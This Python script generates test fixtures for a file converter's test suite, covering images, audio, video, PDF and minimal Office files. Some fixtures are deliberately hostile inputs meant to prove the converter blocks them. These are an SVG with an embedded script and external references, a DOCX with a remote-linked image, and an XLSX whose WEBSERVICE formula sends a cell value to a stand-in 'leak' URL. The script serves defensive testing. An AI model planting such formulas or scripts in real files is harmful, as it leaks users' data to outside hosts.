"""Makes the converter's test fixtures (contract milestone-5 §15), small and reproducible:

    docker compose -p filesgg-m5-converter -f docker-compose.test.yml run --rm --build --no-deps \\
        -v "$PWD/api/tests/fixtures/convert:/out" tests python tests/fixtures/convert/make_fixtures.py /out

Run it in the test image (Pillow, pillow-heif and ffmpeg are there). The Office files are zips of minimal OOXML
written here, with fixed timestamps.
"""

import io
import math
import os
import struct
import subprocess
import sys
import wave
import zipfile

from PIL import Image, ImageDraw

FIXED_TIME = (2026, 11, 25, 0, 0, 0)


def gradient(width, height, alpha=False):
    image = Image.new('RGBA' if alpha else 'RGB', (width, height))
    draw = ImageDraw.Draw(image)
    for x in range(width):
        colour = (x * 255 // width, 120, 255 - x * 255 // width)
        draw.line([(x, 0), (x, height)], fill=colour + ((255 - x * 2) % 256,) if alpha else colour)
    draw.rectangle([width // 4, height // 4, width // 2, height // 2], fill=(255, 255, 255, 255) if alpha else
                   (255, 255, 255))
    return image


def png(out):
    gradient(64, 48, alpha=True).save(os.path.join(out, 'sample.png'))


def jpg_with_gps(out):
    """EXIF with a GPS position (and a camera make), which strip_metadata must remove."""
    image = gradient(64, 48)
    exif = Image.Exif()
    exif[0x010F] = 'FilesggTestCamera'
    exif[0x8825] = {1: 'N', 2: (52.0, 22.0, 12.0), 3: 'E', 4: (4.0, 53.0, 30.0)}
    image.save(os.path.join(out, 'gps.jpg'), 'JPEG', quality=80, exif=exif.tobytes())


def heic(out):
    import pillow_heif
    pillow_heif.register_heif_opener()
    gradient(64, 48).save(os.path.join(out, 'sample.heic'), quality=50)


SVG = '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="80" height="60"
     viewBox="0 0 80 60">
  <rect width="80" height="60" fill="#2050c0"/>
  <!-- external references: an absolute path to a file in the test image, and a URL. Neither may be loaded. -->
  <image x="0" y="0" width="40" height="60" xlink:href="/api/tests/fixtures/convert/red.png"/>
  <image x="40" y="0" width="40" height="60" href="http://example.invalid/red.png"/>
  <script>document.documentElement.setAttribute('data-ran', 'yes'); fetch('http://example.invalid/');</script>
</svg>
'''


def svg(out):
    with open(os.path.join(out, 'external.svg'), 'w') as handle:
        handle.write(SVG)
    # what the SVG points at: solid red, so a test can see it wasn't embedded
    Image.new('RGB', (8, 8), (255, 0, 0)).save(os.path.join(out, 'red.png'))


def psd(out):
    """A flat RGB PSD (no layers): the composite image Pillow reads."""
    image = gradient(40, 30)
    width, height = image.size
    data = io.BytesIO()
    data.write(b'8BPS' + struct.pack('>H6xHIIHH', 1, 3, height, width, 8, 3))
    data.write(struct.pack('>I', 0))  # colour mode data
    data.write(struct.pack('>I', 0))  # image resources
    data.write(struct.pack('>I', 0))  # layer and mask information
    data.write(struct.pack('>H', 0))  # raw image data, planar
    for band in image.split():
        data.write(band.tobytes())
    with open(os.path.join(out, 'sample.psd'), 'wb') as handle:
        handle.write(data.getvalue())


def animated_gif(out):
    frames = []
    for index in range(12):
        frame = Image.new('RGB', (64, 64), (20, 20, 20))
        draw = ImageDraw.Draw(frame)
        draw.ellipse([index * 4, 16, index * 4 + 24, 40], fill=(255, 200, 0))
        frames.append(frame)
    frames[0].save(os.path.join(out, 'animated.gif'), save_all=True, append_images=frames[1:], duration=100, loop=0)


def mp4(out):
    """3 s, 160x120 at 15 fps, H.264 with AAC audio."""
    subprocess.run([
        'ffmpeg', '-nostdin', '-hide_banner', '-loglevel', 'error', '-y',
        '-f', 'lavfi', '-i', 'testsrc2=size=160x120:rate=15:duration=3',
        '-f', 'lavfi', '-i', 'sine=frequency=440:sample_rate=22050:duration=3',
        '-c:v', 'libx264', '-preset', 'veryfast', '-crf', '35', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-b:a', '32k',
        '-fflags', '+bitexact', '-flags:v', '+bitexact', '-flags:a', '+bitexact', '-map_metadata', '-1',
        '-movflags', '+faststart', os.path.join(out, 'clip.mp4')], check=True)


def wav(out):
    """1 s of a quiet 330 Hz tone, mono 8 kHz 16-bit (loud enough to measure, quiet enough to normalise)."""
    rate = 8000
    frames = b''.join(struct.pack('<h', int(3000 * math.sin(2 * math.pi * 330 * n / rate))) for n in range(rate))
    with wave.open(os.path.join(out, 'tone.wav'), 'wb') as handle:
        handle.setnchannels(1)
        handle.setsampwidth(2)
        handle.setframerate(rate)
        handle.writeframes(frames)


def pdf(out, pages=3):
    """A minimal PDF, one filled rectangle and a page number per page, written by hand."""
    objects = ['<< /Type /Catalog /Pages 2 0 R >>',
               '<< /Type /Pages /Kids [{}] /Count {} >>'.format(
                   ' '.join('{} 0 R'.format(3 + i * 2) for i in range(pages)), pages)]
    font = 3 + pages * 2
    for index in range(pages):
        content = '0.{0} 0.3 0.6 rg 20 20 160 100 re f BT /F1 24 Tf 80 60 Td ({1}) Tj ET'.format(index + 2, index + 1)
        objects.append('<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 140] /Contents {} 0 R '
                       '/Resources << /Font << /F1 {} 0 R >> >> >>'.format(4 + index * 2, font))
        objects.append('<< /Length {} >>\nstream\n{}\nendstream'.format(len(content), content))
    objects.append('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
    body = io.BytesIO()
    body.write(b'%PDF-1.4\n')
    offsets = []
    for number, obj in enumerate(objects, 1):
        offsets.append(body.tell())
        body.write('{} 0 obj\n{}\nendobj\n'.format(number, obj).encode('latin-1'))
    xref = body.tell()
    body.write('xref\n0 {}\n0000000000 65535 f \n'.format(len(objects) + 1).encode())
    for offset in offsets:
        body.write('{:010d} 00000 n \n'.format(offset).encode())
    body.write('trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n'.format(len(objects) + 1, xref).encode())
    with open(os.path.join(out, 'three-pages.pdf'), 'wb') as handle:
        handle.write(body.getvalue())


# --- minimal OOXML -------------------------------------------------------------------------------------------------

def write_zip(path, files):
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as archive:
        for name, text in files:
            info = zipfile.ZipInfo(name, FIXED_TIME)
            info.compress_type = zipfile.ZIP_DEFLATED
            archive.writestr(info, text)


ROOT_RELS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
             '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
             '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
             'officeDocument" Target="{}"/></Relationships>')
REL = '<Relationship Id="{}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/{}" Target="{}"{}/>'
RELS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{}</Relationships>')


def content_types(overrides, png=False):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            + ('<Default Extension="png" ContentType="image/png"/>' if png else '')
            + ''.join('<Override PartName="{}" ContentType="{}"/>'.format(p, t) for p, t in overrides)
            + '</Types>')


W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
DOCX_TYPE = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml'


def docx(out):
    document = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="{}"><w:body>'
                '<w:p><w:r><w:t>files.gg converter test document</w:t></w:r></w:p>'
                '<w:p><w:r><w:t>Second paragraph.</w:t></w:r></w:p></w:body></w:document>').format(W)
    write_zip(os.path.join(out, 'document.docx'), [
        ('[Content_Types].xml', content_types([('/word/document.xml', DOCX_TYPE)])),
        ('_rels/.rels', ROOT_RELS.format('word/document.xml')),
        ('word/document.xml', document),
    ])


def docx_remote_image(out):
    """A picture linked (not embedded) from a URL: LibreOffice would fetch it if it could."""
    drawing = (
        '<w:drawing><wp:inline><wp:extent cx="914400" cy="914400"/><wp:docPr id="1" name="Remote"/>'
        '<a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">'
        '<pic:pic><pic:nvPicPr><pic:cNvPr id="1" name="remote.png"/><pic:cNvPicPr/></pic:nvPicPr>'
        '<pic:blipFill><a:blip r:link="rId2"/><a:stretch><a:fillRect/></a:stretch></pic:blipFill>'
        '<pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="914400" cy="914400"/></a:xfrm>'
        '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr></pic:pic></a:graphicData></a:graphic>'
        '</wp:inline></w:drawing>')
    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="{}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
        'xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" '
        'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
        'xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"><w:body>'
        '<w:p><w:r><w:t>A remote image follows.</w:t></w:r></w:p><w:p><w:r>{}</w:r></w:p></w:body></w:document>'
    ).format(W, drawing)
    write_zip(os.path.join(out, 'remote-image.docx'), [
        ('[Content_Types].xml', content_types([('/word/document.xml', DOCX_TYPE)])),
        ('_rels/.rels', ROOT_RELS.format('word/document.xml')),
        ('word/document.xml', document),
        ('word/_rels/document.xml.rels', RELS.format(REL.format('rId2', 'image', 'http://example.invalid/remote.png',
                                                                ' TargetMode="External"'))),
    ])


def xlsx(out):
    """A WEBSERVICE() formula: Calc never recalculates on load (registrymodifications.xcu), and has no network."""
    sheet = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
             '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
             '<row r="1"><c r="A1" t="inlineStr"><is><t>files.gg</t></is></c><c r="B1"><v>42</v></c></row>'
             '<row r="2"><c r="A2" t="str"><f>_xlfn.WEBSERVICE("http://example.invalid/leak?x="&amp;B1)</f>'
             '<v>cached</v></c></row></sheetData></worksheet>')
    workbook = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
                '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>')
    write_zip(os.path.join(out, 'webservice.xlsx'), [
        ('[Content_Types].xml', content_types([
            ('/xl/workbook.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml'),
            ('/xl/worksheets/sheet1.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml'),
        ])),
        ('_rels/.rels', ROOT_RELS.format('xl/workbook.xml')),
        ('xl/workbook.xml', workbook),
        ('xl/_rels/workbook.xml.rels', RELS.format(REL.format('rId1', 'worksheet', 'worksheets/sheet1.xml', ''))),
        ('xl/worksheets/sheet1.xml', sheet),
    ])


P = 'http://schemas.openxmlformats.org/presentationml/2006/main'
A = 'http://schemas.openxmlformats.org/drawingml/2006/main'
R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
PPTX_TYPES = 'application/vnd.openxmlformats-officedocument.presentationml.'
EMPTY_TREE = ('<p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>'
              '<p:grpSpPr/>{}</p:spTree></p:cSld>')
THEME = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><a:theme xmlns:a="{0}" name="T"><a:themeElements>'
         '<a:clrScheme name="T">' + ''.join(
             '<a:{0}><a:srgbClr val="{1}"/></a:{0}>'.format(name, value) for name, value in (
                 ('dk1', '000000'), ('lt1', 'FFFFFF'), ('dk2', '1F497D'), ('lt2', 'EEECE1'), ('accent1', '4F81BD'),
                 ('accent2', 'C0504D'), ('accent3', '9BBB59'), ('accent4', '8064A2'), ('accent5', '4BACC6'),
                 ('accent6', 'F79646'), ('hlink', '0000FF'), ('folHlink', '800080'))) +
         '</a:clrScheme><a:fontScheme name="T"><a:majorFont><a:latin typeface="Arial"/><a:ea typeface=""/>'
         '<a:cs typeface=""/></a:majorFont><a:minorFont><a:latin typeface="Arial"/><a:ea typeface=""/>'
         '<a:cs typeface=""/></a:minorFont></a:fontScheme><a:fmtScheme name="T"><a:fillStyleLst>'
         + '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>' * 3 + '</a:fillStyleLst><a:lnStyleLst>'
         + '<a:ln w="9525"><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln>' * 3
         + '</a:lnStyleLst><a:effectStyleLst>' + '<a:effectStyle><a:effectLst/></a:effectStyle>' * 3
         + '</a:effectStyleLst><a:bgFillStyleLst>' + '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>' * 3
         + '</a:bgFillStyleLst></a:fmtScheme></a:themeElements></a:theme>').format(A)


def slide_xml(text):
    shape = ('<p:sp><p:nvSpPr><p:cNvPr id="2" name="Title"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm>'
             '<a:off x="457200" y="457200"/><a:ext cx="8229600" cy="1143000"/></a:xfrm><a:prstGeom prst="rect">'
             '<a:avLst/></a:prstGeom></p:spPr><p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:rPr lang="en-US"/>'
             '<a:t>{}</a:t></a:r></a:p></p:txBody></p:sp>').format(text)
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><p:sld xmlns:a="{}" xmlns:r="{}" xmlns:p="{}">'
            + EMPTY_TREE.format(shape) + '</p:sld>').format(A, R, P)


def pptx(out, slides=3):
    layout_rel = RELS.format(REL.format('rId1', 'slideLayout', '../slideLayouts/slideLayout1.xml', ''))
    master = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><p:sldMaster xmlns:a="{0}" xmlns:r="{1}" '
              'xmlns:p="{2}">' + EMPTY_TREE.format('') +
              '<p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" '
              'accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" '
              'folHlink="folHlink"/><p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/>'
              '</p:sldLayoutIdLst></p:sldMaster>').format(A, R, P)
    layout = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><p:sldLayout xmlns:a="{0}" xmlns:r="{1}" '
              'xmlns:p="{2}">' + EMPTY_TREE.format('') + '</p:sldLayout>').format(A, R, P)
    presentation = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><p:presentation xmlns:a="{0}" '
                    'xmlns:r="{1}" xmlns:p="{2}"><p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/>'
                    '</p:sldMasterIdLst><p:sldIdLst>{3}</p:sldIdLst><p:sldSz cx="9144000" cy="6858000"/>'
                    '<p:notesSz cx="6858000" cy="9144000"/></p:presentation>').format(
        A, R, P, ''.join('<p:sldId id="{}" r:id="rId{}"/>'.format(256 + i, i + 2) for i in range(slides)))
    rels = [REL.format('rId1', 'slideMaster', 'slideMasters/slideMaster1.xml', '')]
    rels += [REL.format('rId{}'.format(i + 2), 'slide', 'slides/slide{}.xml'.format(i + 1), '') for i in range(slides)]
    rels.append(REL.format('rId{}'.format(slides + 2), 'theme', 'theme/theme1.xml', ''))
    overrides = [('/ppt/presentation.xml', PPTX_TYPES + 'presentation.main+xml'),
                 ('/ppt/slideMasters/slideMaster1.xml', PPTX_TYPES + 'slideMaster+xml'),
                 ('/ppt/slideLayouts/slideLayout1.xml', PPTX_TYPES + 'slideLayout+xml'),
                 ('/ppt/theme/theme1.xml', 'application/vnd.openxmlformats-officedocument.theme+xml')]
    overrides += [('/ppt/slides/slide{}.xml'.format(i + 1), PPTX_TYPES + 'slide+xml') for i in range(slides)]
    files = [
        ('[Content_Types].xml', content_types(overrides)),
        ('_rels/.rels', ROOT_RELS.format('ppt/presentation.xml')),
        ('ppt/presentation.xml', presentation),
        ('ppt/_rels/presentation.xml.rels', RELS.format(''.join(rels))),
        ('ppt/slideMasters/slideMaster1.xml', master),
        ('ppt/slideMasters/_rels/slideMaster1.xml.rels', RELS.format(
            REL.format('rId1', 'slideLayout', '../slideLayouts/slideLayout1.xml', '')
            + REL.format('rId2', 'theme', '../theme/theme1.xml', ''))),
        ('ppt/slideLayouts/slideLayout1.xml', layout),
        ('ppt/slideLayouts/_rels/slideLayout1.xml.rels', RELS.format(
            REL.format('rId1', 'slideMaster', '../slideMasters/slideMaster1.xml', ''))),
        ('ppt/theme/theme1.xml', THEME),
    ]
    for i in range(slides):
        files.append(('ppt/slides/slide{}.xml'.format(i + 1), slide_xml('Slide {}'.format(i + 1))))
        files.append(('ppt/slides/_rels/slide{}.xml.rels'.format(i + 1), layout_rel))
    write_zip(os.path.join(out, 'slides.pptx'), files)


def main(out):
    os.makedirs(out, exist_ok=True)
    for make in (png, jpg_with_gps, heic, svg, psd, animated_gif, mp4, wav, pdf, docx, docx_remote_image, xlsx, pptx):
        make(out)
    for name in sorted(os.listdir(out)):
        if name != os.path.basename(__file__):
            print('{:24} {:>8}'.format(name, os.path.getsize(os.path.join(out, name))))


if __name__ == '__main__':
    main(sys.argv[1] if len(sys.argv) > 1 else os.path.dirname(os.path.abspath(__file__)))
